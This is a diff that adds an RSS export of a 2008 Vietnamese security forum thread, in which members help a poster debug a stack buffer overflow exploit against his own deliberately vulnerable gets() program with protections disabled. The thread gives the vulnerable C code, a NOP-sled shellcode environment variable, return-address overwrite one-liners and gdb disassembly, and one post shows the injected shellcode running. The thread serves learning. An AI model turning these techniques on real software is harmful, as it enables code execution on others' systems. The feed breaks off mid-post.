@@ -1,0 +1,813 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Latest posts for the topic "Vấn đề khi thử exploit hàm gets"]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/list/23.hva</link>
+		<description><![CDATA[Latest messages posted in the topic "Vấn đề khi thử exploit hàm gets"]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>Vấn đề khi thử exploit hàm gets</title>
+				<description><![CDATA[ Em có 1 chương trình như thế này:
+
+(Chương trình getname.c dịch ra getname.out)
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+
+int main&#40;int argc, char **argv&#41;
+{
+  char name&#91;8&#93;;
+  printf&#40;"What is your name: "&#41;;
+  gets&#40;name&#41;;
+  printf&#40;"Aha, your name is: %s\n",name&#41;;
+  return 0;
+}</pre>
+		</div>
+
+Ở đây chương trình gặp lỗi buffer overflow ở hàm gets. Em đưa đoạn shellcode vào biến môi trường code như sau
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>export CODE=`perl -e 'print "\x90"x20';cat shellcode`</pre>
+		</div>
+
+trong đó file shellcode chứa shellcode để đổ ra 1 shell.
+
+Dùng 1 chương trình lấy địa chỉ biến môi trường CODE ví dụ là: 0xbffffeb3. Sau đó em thử nhồi địa chỉ shellcode vào buffer của chương trình trên như sau:
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>perl -e 'print "\xb3\xfe\xff\xbf"x20' | ./getname.out</pre>
+		</div>
+
+Tuy vậy chương trình không thể nào nhảy được về đoạn shellcode trong biến CODE ở trên mà luôn luôn nhảy đến lệnh printf tiếp theo và chương trình vẫn printf đoạn địa chỉ em nhồi vào. Ai có thể chỉ cho em tại sao được không? :) 
+
+(Em đã disable cơ chế bảo vệ stack (-fno-stack-protector), stack alignment 4 bytes, và không cho hệ điều hành load địa chỉ random).]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/24349.hva#147046</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/24349.hva#147046</link>
+				<pubDate><![CDATA[Fri, 15 Aug 2008 13:12:21]]> GMT</pubDate>
+				<author><![CDATA[ Tal]]></author>
+			</item>
+			<item>
+				<title>Re: Vấn đề khi thử exploit hàm gets</title>
+				<description><![CDATA[ @Tal: bạn phải gdb debug xem chuyện gì xảy ra chứ ? Chứ nói vậy ai mà mò dùm bạn?
+Trước hết bạn cho vài thông tin:
+1.gcc --version
+2.gdb ./target
+disassemble main
+... vv]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/24349.hva#147048</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/24349.hva#147048</link>
+				<pubDate><![CDATA[Fri, 15 Aug 2008 13:22:04]]> GMT</pubDate>
+				<author><![CDATA[ Cognac]]></author>
+			</item>
+			<item>
+				<title>Re: Vấn đề khi thử exploit hàm gets</title>
+				<description><![CDATA[ @Tal: có hai điểm bạn cần chú ý, tôi sẽ đưa dạng câu hỏi, để bạn tự tìm hiểu:
+
+1. Khi overflow biến name, nghĩa là bạn đang overflow RIP của hàm nào? Khi trả lời được câu hỏi này, bạn sẽ hiểu tại sao hàm printf tiếp theo vẫn được thực thi bình thường.
+
+2. mỗi chương trình khi được chạy, sẽ có một môi trường khác nhau, nên địa chỉ của biến môi trường lầy từ chương trình A sẽ khác với địa chỉ của biến môi trường đó trong chương trình B. Bạn hãy coi là nó khác thế nào?
+
+Ngoài ra, như Cognac nói, bạn nên cung cấp thêm thông tin.
+
+--m]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/24349.hva#147056</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/24349.hva#147056</link>
+				<pubDate><![CDATA[Fri, 15 Aug 2008 13:37:42]]> GMT</pubDate>
+				<author><![CDATA[ mrro]]></author>
+			</item>
+			<item>
+				<title>Re: Vấn đề khi thử exploit hàm gets</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">Cognac wrote:</cite><br>
+		<blockquote>@Tal: bạn phải gdb debug xem chuyện gì xảy ra chứ ? Chứ nói vậy ai mà mò dùm bạn?
+Trước hết bạn cho vài thông tin:
+1.gcc --version
+2.gdb ./target
+disassemble main
+... vv&nbsp;
+		</blockquote>
+
+Thử gdb rồi nhưng không được, cần sự hướng dẫn cách gdb mà  :(
+
+Thông tin thì có ngay ;) 
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>gcc --version
+
+gcc &#40;GCC&#41; 4.2.3 &#40;Ubuntu 4.2.3-2ubuntu7&#41;
+Copyright &#40;C&#41; 2007 Free Software Foundation, Inc.
+This is free software; see the source for copying conditions.  There is NO
+warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</pre>
+		</div>
+
+Mã assembly của hàm main chương trình getname:
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>&#40;gdb&#41; disas main
+Dump of assembler code for function main:
+0x080483a4 &lt;main+0&gt;:	push   %ebp
+0x080483a5 &lt;main+1&gt;:	mov    %esp,%ebp
+0x080483a7 &lt;main+3&gt;:	sub    $0x10,%esp
+0x080483aa &lt;main+6&gt;:	movl   $0x80484a0,&#40;%esp&#41;
+0x080483b1 &lt;main+13&gt;:	call   0x804830c &lt;printf@plt&gt;
+0x080483b6 &lt;main+18&gt;:	lea    -0x8&#40;%ebp&#41;,%eax
+0x080483b9 &lt;main+21&gt;:	mov    %eax,&#40;%esp&#41;
+0x080483bc &lt;main+24&gt;:	call   0x80482ec &lt;gets@plt&gt;
+0x080483c1 &lt;main+29&gt;:	lea    -0x8&#40;%ebp&#41;,%eax
+0x080483c4 &lt;main+32&gt;:	mov    %eax,0x4&#40;%esp&#41;
+0x080483c8 &lt;main+36&gt;:	movl   $0x80484b4,&#40;%esp&#41;
+0x080483cf &lt;main+43&gt;:	call   0x804830c &lt;printf@plt&gt;
+0x080483d4 &lt;main+48&gt;:	mov    $0x0,%eax
+0x080483d9 &lt;main+53&gt;:	leave  
+0x080483da &lt;main+54&gt;:	ret    
+End of assembler dump.</pre>
+		</div>
+
+
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/24349.hva#147057</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/24349.hva#147057</link>
+				<pubDate><![CDATA[Fri, 15 Aug 2008 13:37:50]]> GMT</pubDate>
+				<author><![CDATA[ Tal]]></author>
+			</item>
+			<item>
+				<title>Vấn đề khi thử exploit hàm gets</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">Tal wrote:</cite><br>
+		<blockquote>
+Dùng 1 chương trình lấy địa chỉ biến môi trường CODE ví dụ là: 0xbffffeb3.
+&nbsp;
+		</blockquote>
+
+Làm sao bạn biết địa chỉ biến môi trường CODE là như vậy?]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/24349.hva#147703</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/24349.hva#147703</link>
+				<pubDate><![CDATA[Tue, 19 Aug 2008 10:50:08]]> GMT</pubDate>
+				<author><![CDATA[ mybb]]></author>
+			</item>
+			<item>
+				<title>Re: Vấn đề khi thử exploit hàm gets</title>
+				<description><![CDATA[ Mình dùng 1 chương trình như sau:
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+
+int main&#40;int argc, char **argv&#41; {
+  char *addr;
+  if &#40;argc &lt; 2&#41; {
+    printf&#40;"Usage: %s &lt;env var name&gt;\n", argv&#91;0&#93;&#41;;
+  } else {
+    addr = getenv&#40;argv&#91;1&#93;&#41;;
+    if &#40;addr == NULL&#41; {
+      printf&#40;"The environment variable %s does not exist\\n", argv&#91;1&#93;&#41;;
+    } else {
+      printf&#40;"%s is located at %p\n", argv&#91;1&#93;, addr&#41;;
+    }
+  }
+  return 0;
+}</pre>
+		</div>]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/24349.hva#147945</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/24349.hva#147945</link>
+				<pubDate><![CDATA[Wed, 20 Aug 2008 18:37:46]]> GMT</pubDate>
+				<author><![CDATA[ Tal]]></author>
+			</item>
+			<item>
+				<title>Re: Vấn đề khi thử exploit hàm gets</title>
+				<description><![CDATA[ Nhìn đoạn disassembly của bạn, mình đề nghị bạn chạy thử cái này xem:
+python -c 'print "A"*12 + "\xAA\xBB\xXCC\xDD"' |./vul
+
+Lưuý: \xAA\xBB\xCC\xDD là địa chỉ biến môi trường CODE chứa shellcode của bạn
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/24349.hva#148518</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/24349.hva#148518</link>
+				<pubDate><![CDATA[Mon, 25 Aug 2008 02:22:29]]> GMT</pubDate>
+				<author><![CDATA[ Cognac]]></author>
+			</item>
+			<item>
+				<title>Re: Vấn đề khi thử exploit hàm gets</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">Tal wrote:</cite><br>
+		<blockquote>Mình dùng 1 chương trình như sau:
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+
+int main&#40;int argc, char **argv&#41; {
+  char *addr;
+  if &#40;argc &lt; 2&#41; {
+    printf&#40;"Usage: %s &lt;env var name&gt;\n", argv&#91;0&#93;&#41;;
+  } else {
+    addr = getenv&#40;argv&#91;1&#93;&#41;;
+    if &#40;addr == NULL&#41; {
+      printf&#40;"The environment variable %s does not exist\\n", argv&#91;1&#93;&#41;;
+    } else {
+      printf&#40;"%s is located at %p\n", argv&#91;1&#93;, addr&#41;;
+    }
+  }
+  return 0;
+}</pre>
+		</div>&nbsp;
+		</blockquote>
+
+Ý mình là làm sao bạn biết địa chỉ biến môi trường khi bạn chạy cái chương trình lấy ở trên và khi chạy cái getname.out của bạn là trùng nhau? Nếu nó khác thì sao?]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/24349.hva#148618</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/24349.hva#148618</link>
+				<pubDate><![CDATA[Tue, 26 Aug 2008 18:20:14]]> GMT</pubDate>
+				<author><![CDATA[ mybb]]></author>
+			</item>
+			<item>
+				<title>Re: Vấn đề khi thử exploit hàm gets</title>
+				<description><![CDATA[ Mấy bữa nay đi dạy ở hai trường bên Singapore cũng có người hỏi về cái này, hehehe :-D.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/24349.hva#148657</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/24349.hva#148657</link>
+				<pubDate><![CDATA[Wed, 27 Aug 2008 01:17:27]]> GMT</pubDate>
+				<author><![CDATA[ lamer]]></author>
+			</item>
+			<item>
+				<title>Re: Vấn đề khi thử exploit hàm gets</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">Cognac wrote:</cite><br>
+		<blockquote>Nhìn đoạn disassembly của bạn, mình đề nghị bạn chạy thử cái này xem:
+python -c 'print "A"*12 + "\xAA\xBB\xXCC\xDD"' |./vul
+
+Lưuý: \xAA\xBB\xCC\xDD là địa chỉ biến môi trường CODE chứa shellcode của bạn
+&nbsp;
+		</blockquote>
+Bạn có nhầm không vì độ dài của buffer là 16 bytes + 8 bytes nữa của con trỏ và địa chỉ trả về mới ghi đè được địa chỉ trả về chứ? Lệnh khai thác của bạn mới chỉ đẩy vào buffer 16 bytes = độ dài buffer :-/
+Ở đoạn code khai thác mình mới để 20 bytes nên địa chỉ trả về là sai -&gt; không khai thác được. Nhưng khi mình đẩy vào buffer nhiều thứ hơn, nó vẫn chưa nhảy về đúng đoạn shell. Đấy là chỗ mình chưa nắm rõ
+Hơn nữa là đúng như anh mrro nói, mình đã xác định sai mục tiêu.
+
+<p></p>
+		<cite class="blockquote">mybb wrote:</cite><br>
+		<blockquote>Ý mình là làm sao bạn biết địa chỉ biến môi trường khi bạn chạy cái chương trình lấy ở trên và khi chạy cái getname.out của bạn là trùng nhau? Nếu nó khác thì sao?
+&nbsp;
+		</blockquote>
+Biến môi trường được nạp tại địa chỉ gần nhau nếu tên chương trình chạy có độ dài gần nhau. Ở đây tớ thấy độ dài của 1 chương trình là getname, 1 cái là getenv hơn kém nhau 1 ký tự -&gt; địa chỉ sẽ nạp chênh lệch nhau là 2 bytes. Vậy cơ bản là địa chỉ không chênh lệch lắm khi có đoạn NOP bảo kê.
+
+@anh lamer:
+Hì hì anh chỉ cho em cách exploit thằng này với :D
+
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/24349.hva#148750</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/24349.hva#148750</link>
+				<pubDate><![CDATA[Thu, 28 Aug 2008 10:54:21]]> GMT</pubDate>
+				<author><![CDATA[ Tal]]></author>
+			</item>
+			<item>
+				<title>Re: Vấn đề khi thử exploit hàm gets</title>
+				<description><![CDATA[ <blockquote> #include &lt;string.h&gt;
+ #include &lt;stdio.h&gt;
+ 
+ int main(int argc, char **argv)
+ {
+   char <font color='yellow'>name[8]</font>;
+   printf("What is your name: ");
+   gets(name);
+   printf("Aha, your name is: %s\n",name);
+   return 0;
+ }
+@Ta&nbsp;
+		</blockquote>l: Đề nghị bạn <font color='yellow'>đọc kỹ</font> lại đoạn code của bạn xem độ dài buffer là bao nhiêu trước khi tiếp tục  :) ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/24349.hva#148757</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/24349.hva#148757</link>
+				<pubDate><![CDATA[Thu, 28 Aug 2008 11:18:07]]> GMT</pubDate>
+				<author><![CDATA[ Cognac]]></author>
+			</item>
+			<item>
+				<title>Re: Vấn đề khi thử exploit hàm gets</title>
+				<description><![CDATA[ Hì hì, bạn đã hiểu cái vụ biến môi trường rồi còn gì.
+
+Việc chương trình vẫn chạy tới lệnh printf là đúng rồi, nó chỉ nhảy về cái shellcode của bạn khi nào main() return thôi chứ. Vậy thì đâu có gì mà thắc mắc nhỉ?
+
+@Cognac: hì hì, mình nghĩ bạn nên xem lại đoạn disassemble rồi hãy bắt người khác đọc lại nhé.
+
+Bổ sung tí: Cái đoạn mã khai thác bạn cho vào là 80 bytes chứ không phải 20bytes.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/24349.hva#148793</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/24349.hva#148793</link>
+				<pubDate><![CDATA[Thu, 28 Aug 2008 16:01:49]]> GMT</pubDate>
+				<author><![CDATA[ mybb]]></author>
+			</item>
+			<item>
+				<title>Re: Vấn đề khi thử exploit hàm gets</title>
+				<description><![CDATA[ mybb: tui thấy Cognac nói đúng mà?
+
+--m]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/24349.hva#148796</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/24349.hva#148796</link>
+				<pubDate><![CDATA[Thu, 28 Aug 2008 16:21:44]]> GMT</pubDate>
+				<author><![CDATA[ mrro]]></author>
+			</item>
+			<item>
+				<title>Re: Vấn đề khi thử exploit hàm gets</title>
+				<description><![CDATA[ @mrro:  đó là trong code thôi mrro, còn thực tế (khi disass ra) thì:
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>0x080483a7 &lt;main+3&gt;:	sub    $0x10,%esp</pre>
+		</div>
+
+Thì 16 byte mới tới được ebp (chưa đè lên ebp nữa) làm sao mà đè EIP? :-\
+
+Mà ở đây dùng gcc 4.2.5 thì làm gì có khái niệm đè "tới" chỗ này hay chỗ kia :D]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/24349.hva#148863</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/24349.hva#148863</link>
+				<pubDate><![CDATA[Thu, 28 Aug 2008 23:56:25]]> GMT</pubDate>
+				<author><![CDATA[ mybb]]></author>
+			</item>
+			<item>
+				<title>Re: Vấn đề khi thử exploit hàm gets</title>
+				<description><![CDATA[ Hì hì, thực ra thì đúng là tớ đã xác định sai mục tiêu khi mở cái post này. Buffer của hàm main của getname nên khi hàm main return, chương trình mới nhảy đến đoạn Shell code. Cho nên câu hỏi tại sao nó printf đã ok. Có điều là tớ chạy thử mãi mà nó vẫn không nhảy đến được đoạn shell và không hiểu tại sao nên muốn hỏi xem ở đây còn gì khúc mắc không.
+
+@mybb: gcc 4.2.5 không đè chỗ này chỗ kia là thế nào thế? Chỉ cho tớ với :D]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/24349.hva#148871</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/24349.hva#148871</link>
+				<pubDate><![CDATA[Fri, 29 Aug 2008 00:27:42]]> GMT</pubDate>
+				<author><![CDATA[ Tal]]></author>
+			</item>
+			<item>
+				<title>Re: Vấn đề khi thử exploit hàm gets</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">Cognac wrote:</cite><br>
+		<blockquote><blockquote> #include &lt;string.h&gt;
+ #include &lt;stdio.h&gt;
+ 
+ int main(int argc, char **argv)
+ {
+   char <font color='yellow'>name[8]</font>;
+   printf("What is your name: ");
+   gets(name);
+   printf("Aha, your name is: %s\n",name);
+   return 0;
+ }
+@Ta&nbsp;
+		</blockquote>l: Đề nghị bạn <font color='yellow'>đọc kỹ</font> lại đoạn code của bạn xem độ dài buffer là bao nhiêu trước khi tiếp tục  :) &nbsp;
+		</blockquote>
+
+Chắc bạn chưa xem cái đoạn disassembly của hàm main :)
+
+ <blockquote>(gdb) disas main
+ Dump of assembler code for function main:
+ 0x080483a4 &lt;main+0&gt;:	push   %ebp
+ 0x080483a5 &lt;main+1&gt;:	mov    %esp,%ebp
+ 0x080483a7 &lt;main+3&gt;:	<font color='yellow'>sub    $0x10,%esp</font>
+ 0x080483aa &lt;main+6&gt;:	movl   $0x80484a0,(%esp)
+ 0x080483b1 &lt;main+13&gt;:	call   0x804830c &lt;printf@plt&gt;
+ 0x080483b6 &lt;main+18&gt;:	lea    -0x8(%ebp),%eax
+ 0x080483b9 &lt;main+21&gt;:	mov    %eax,(%esp)
+ 0x080483bc &lt;main+24&gt;:	call   0x80482ec &lt;gets@plt&gt;
+ 0x080483c1 &lt;main+29&gt;:	lea    -0x8(%ebp),%eax
+ 0x080483c4 &lt;main+32&gt;:	mov    %eax,0x4(%esp)
+ 0x080483c8 &lt;main+36&gt;:	movl   $0x80484b4,(%esp)
+ 0x080483cf &lt;main+43&gt;:	call   0x804830c &lt;printf@plt&gt;
+ 0x080483d4 &lt;main+48&gt;:	mov    $0x0,%eax
+ 0x080483d9 &lt;main+53&gt;:	leave  
+ 0x080483da &lt;main+54&gt;:	ret    
+ End of assembler dump.&nbsp;
+		</blockquote>]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/24349.hva#148873</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/24349.hva#148873</link>
+				<pubDate><![CDATA[Fri, 29 Aug 2008 00:33:40]]> GMT</pubDate>
+				<author><![CDATA[ Tal]]></author>
+			</item>
+			<item>
+				<title>Re: Vấn đề khi thử exploit hàm gets</title>
+				<description><![CDATA[ @mybb: tui đã test thấy chỉ cần 12 byte là overwrite EBP, 16 byte là overwrite EIP y như Cognac nói. btw, dựa vào cái đoạn disassembly mà <b>Tal</b> đưa ra, tui nghĩ Tal kô compile bằng gcc-4.2.3 đâu, tự nếu compile bằng gcc-4.2.3 thì stack nó kô có được *sạch đẹp* như thế. Chắc là gcc-3.3.
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>0x080483a7 &lt;main+3&gt;:	sub    $0x10,%esp</pre>
+		</div>
+
+Cái này có nghĩa là dành ra 16 byte cho local variables, trong trường hợp này là name, đâu có nhất thiết name nó sẽ chiếm 16 byte đâu.
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>0x080483b6 &lt;main+18&gt;:	lea    -0x8&#40;%ebp&#41;,%eax
+ 0x080483b9 &lt;main+21&gt;:	mov    %eax,&#40;%esp&#41;
+ 0x080483bc &lt;main+24&gt;:	call   0x80482ec &lt;gets@plt&gt;</pre>
+		</div>
+
+Cái đoạn code này mới quan trọng nè. Nó cho thấy rõ, name = $ebp - 8 ($ebp này là $ebp của main), nên chỉ cần đưa vào name một chuỗi dài hơn 8 byte thì nó đã bắt đầu overwrite $ebp và $eip khi main trả về (hai cái này gọi chính xác phải là $sbp và $rip).
+
+--m]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/24349.hva#148877</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/24349.hva#148877</link>
+				<pubDate><![CDATA[Fri, 29 Aug 2008 00:38:50]]> GMT</pubDate>
+				<author><![CDATA[ mrro]]></author>
+			</item>
+			<item>
+				<title>Re: Vấn đề khi thử exploit hàm gets</title>
+				<description><![CDATA[ Một ví dụ: tui nhét shellcode (in ra ngày giờ hiện tại) vào địa chỉ 0xbfffff038, cái chương trình test được compile với gcc-3.3 cho giống với cái disassembly mà Tal đưa ra.
+
+<blockquote>
+
+(gdb) disas main
+Dump of assembler code for function main:
+0x080483a4 &lt;main+0&gt;:    push   %ebp
+0x080483a5 &lt;main+1&gt;:    mov    %esp,%ebp
+0x080483a7 &lt;main+3&gt;:    sub    $0x18,%esp
+0x080483aa &lt;main+6&gt;:    and    $0xfffffff0,%esp
+0x080483ad &lt;main+9&gt;:    mov    $0x0,%eax
+0x080483b2 &lt;main+14&gt;:   sub    %eax,%esp
+0x080483b4 &lt;main+16&gt;:   movl   $0x80484b4,(%esp)
+0x080483bb &lt;main+23&gt;:   call   0x80482ec &lt;printf@plt&gt;
+0x080483c0 &lt;main+28&gt;:   lea    -0x8(%ebp),%eax
+0x080483c3 &lt;main+31&gt;:   mov    %eax,(%esp)
+0x080483c6 &lt;main+34&gt;:   call   0x80482cc &lt;gets@plt&gt;
+0x080483cb &lt;main+39&gt;:   lea    -0x8(%ebp),%eax
+0x080483ce &lt;main+42&gt;:   mov    %eax,0x4(%esp)
+0x080483d2 &lt;main+46&gt;:   movl   $0x80484c8,(%esp)
+0x080483d9 &lt;main+53&gt;:   call   0x80482ec &lt;printf@plt&gt;
+0x080483de &lt;main+58&gt;:   mov    $0x0,%eax
+0x080483e3 &lt;main+63&gt;:   leave  
+0x080483e4 &lt;main+64&gt;:   ret  
+
+m@h:~$ python -c 'print "A" * 12 + "\x38\xf0\xff\xbf"' | ~/test
+What is your name: Aha, your name is: AAAAAAAAAAAA8���
+Thu Aug 28 22:51:48 ICT 2008
+
+&nbsp;
+		</blockquote>
+
+--m
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/24349.hva#148885</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/24349.hva#148885</link>
+				<pubDate><![CDATA[Fri, 29 Aug 2008 00:53:17]]> GMT</pubDate>
+				<author><![CDATA[ mrro]]></author>
+			</item>
+			<item>
+				<title>Re: Vấn đề khi thử exploit hàm gets</title>
+				<description><![CDATA[ Ờ, lúc đầu cũng ngờ ngợ sao gcc 4.2 lại có cái asm đẹp vậy nhưng không có cái gì để thử xem trên máy mình nó có đẹp thế hay không. Còn về vụ gcc 4.2 tại sao không có vụ "tới" chỗ này chỗ kia là vì layout nó đổi rồi.
+
+@mrro: ừ, không xem kỹ chỗ load effective address, xin lỗi mrro và Cognac :-)]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/24349.hva#148891</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/24349.hva#148891</link>
+				<pubDate><![CDATA[Fri, 29 Aug 2008 01:10:46]]> GMT</pubDate>
+				<author><![CDATA[ mybb]]></author>
+			</item>
+			<item>
+				<title>Re: Vấn đề khi thử exploit hàm gets</title>
+				<description><![CDATA[ À hiểu rồi. Cognag đúng rồi!
+
+Hì hì, em compile bằng gcc 4.2.3 thật mà. Option compile là thế này:
+
+-fno-stack-protector
+-mpreferred-stack-boundary=2]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/24349.hva#148904</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/24349.hva#148904</link>
+				<pubDate><![CDATA[Fri, 29 Aug 2008 09:21:05]]> GMT</pubDate>
+				<author><![CDATA[ Tal]]></author>
+			</item>
+			<item>
+				<title>Re: Vấn đề khi thử exploit hàm gets</title>
+				<description><![CDATA[ @Tal: Bạn có thể giải thích tại sao khi compile, bạn cho thằng -mpreferred-stack-boundary=2 được ko? :) 
+Cái này có lẽ liên quan đến memory allocate của gcc, dung lượng stack frame đc gcc cấp sẽ thay đổi phụ thuộc vào thuộc tính này ?? :-/ 
+Trong trường hợp này là
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>0x080483a7 &lt;main+3&gt;:	sub    $0x10,%esp</pre>
+		</div>
+@TaL, mrro: Bạn nói rõ hơn về stack layout của gcc 4.2.x được ko?  :). Cụ thể là nếu compile đoạn mã này bằng gcc 4.2 và preferred-stack-boundary=4 thì sẽ exploit thế nào?]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/24349.hva#149069</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/24349.hva#149069</link>
+				<pubDate><![CDATA[Sat, 30 Aug 2008 12:38:51]]> GMT</pubDate>
+				<author><![CDATA[ Cognac]]></author>
+			</item>
+			<item>
+				<title>Re: Vấn đề khi thử exploit hàm gets</title>
+				<description><![CDATA[ @Cognac: lúc đó sẽ có hai trường hợp:
+
+- có SSP <span class="link"> http://www.trl.ibm.com/projects/security/ssp/</span>) hay không? nếu có SSP thì đối với đoạn mã này mặc dù bị lỗi nhưng sẽ kô thể khai thác được, chỉ có làm cho chương trình nó crash thôi. 
+
+- không có SSP (compile với option <b>-fno-stack-protector</b>), lúc này mã dissasembly của đoạn chương trình trên sẽ như sau:
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>&#40;gdb&#41; disas main
+Dump of assembler code for function main:
+0x080483a4 &lt;main+0&gt;:    lea    0x4&#40;%esp&#41;,%ecx
+0x080483a8 &lt;main+4&gt;:    and    $0xfffffff0,%esp
+0x080483ab &lt;main+7&gt;:    pushl  -0x4&#40;%ecx&#41;
+0x080483ae &lt;main+10&gt;:   push   %ebp
+0x080483af &lt;main+11&gt;:   mov    %esp,%ebp
+0x080483b1 &lt;main+13&gt;:   push   %ecx
+0x080483b2 &lt;main+14&gt;:   sub    $0x24,%esp
+0x080483b5 &lt;main+17&gt;:   movl   $0x80484b0,&#40;%esp&#41;
+0x080483bc &lt;main+24&gt;:   call   0x804830c &lt;printf@plt&gt;
+0x080483c1 &lt;main+29&gt;:   lea    -0xc&#40;%ebp&#41;,%eax
+0x080483c4 &lt;main+32&gt;:   mov    %eax,&#40;%esp&#41;
+0x080483c7 &lt;main+35&gt;:   call   0x80482ec &lt;gets@plt&gt;
+0x080483cc &lt;main+40&gt;:   lea    -0xc&#40;%ebp&#41;,%eax
+0x080483cf &lt;main+43&gt;:   mov    %eax,0x4&#40;%esp&#41;
+0x080483d3 &lt;main+47&gt;:   movl   $0x80484c4,&#40;%esp&#41;
+0x080483da &lt;main+54&gt;:   call   0x804830c &lt;printf@plt&gt;
+0x080483df &lt;main+59&gt;:   mov    $0x0,%eax
+0x080483e4 &lt;main+64&gt;:   add    $0x24,%esp
+0x080483e7 &lt;main+67&gt;:   pop    %ecx
+0x080483e8 &lt;main+68&gt;:   pop    %ebp
+0x080483e9 &lt;main+69&gt;:   lea    -0x4&#40;%ecx&#41;,%esp
+0x080483ec &lt;main+72&gt;:   ret    
+End of assembler dump.</pre>
+		</div>
+
+Hơi khó exploit một chút, nhưng vẫn có thể exploit được. Bồ thử tìm hiểu cách exploit xem, gợi ý: chú ý vào <b>ecx</b>.
+
+--m]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/24349.hva#149095</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/24349.hva#149095</link>
+				<pubDate><![CDATA[Sat, 30 Aug 2008 15:59:26]]> GMT</pubDate>
+				<author><![CDATA[ mrro]]></author>
+			</item>
+			<item>
+				<title>Re: Vấn đề khi thử exploit hàm gets</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">Cognac wrote:</cite><br>
+		<blockquote>@Tal: Bạn có thể giải thích tại sao khi compile, bạn cho thằng -mpreferred-stack-boundary=2 được ko? :) 
+Cái này có lẽ liên quan đến memory allocate của gcc, dung lượng stack frame đc gcc cấp sẽ thay đổi phụ thuộc vào thuộc tính này ?? :-/ 
+Trong trường hợp này là
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>0x080483a7 &lt;main+3&gt;:	sub    $0x10,%esp</pre>
+		</div>
+&nbsp;
+		</blockquote>
+
